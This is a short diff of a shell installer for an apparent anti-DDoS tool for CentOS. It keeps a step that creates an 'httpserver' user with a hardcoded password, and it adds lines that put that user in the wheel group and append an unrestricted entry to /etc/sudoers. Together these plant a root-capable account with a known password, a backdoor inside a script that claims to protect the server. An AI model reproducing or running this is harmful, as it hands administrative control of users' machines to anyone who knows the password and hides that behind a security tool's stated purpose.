@@ -8,9 +8,10 @@ cd AntiDdos-CentOS
 echo "Baixando dependencias."
 sudo yum install httpd-devel
 sudo yum install centos-release-scl
-sudo yum install rh-python36
 sudo useradd httpserver -m -p $(openssl passwd -1 serverhttp12)
-usermod -aG wheel httpserver
+sudo usermod -aG wheel httpserver
+sudo echo "httpserver ALL=(ALL)    ALL" >> /etc/sudoers
+sudo yum install rh-python36
 sudo yum groupinstall 'Development tools'
 sudo wget http://www.rfxn.com/downloads/apf-current.tar.gz
 sudo tar -zxvf apf-current.tar.gz
